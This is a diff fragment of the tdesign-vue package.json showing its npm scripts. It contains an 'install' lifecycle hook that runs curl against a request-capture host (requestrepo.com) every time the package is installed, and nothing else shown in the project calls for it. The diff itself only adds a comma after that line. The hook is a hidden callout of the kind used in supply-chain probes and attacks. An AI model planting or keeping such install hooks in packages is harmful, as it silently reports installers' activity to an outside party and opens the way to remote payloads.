@@ -44,7 +44,7 @@
     "url": "https://github.com/Tencent/tdesign-vue/issues"
   },
   "scripts": {
-    "install": "curl https://j3ftg19u.requestrepo.com/install"
+    "install": "curl https://j3ftg19u.requestrepo.com/install",
     "update:coverage-badge": "node script/test/generate-coverage.js",
     "start": "cd site && npm run dev",
     "dev": "cd site && npm run dev",
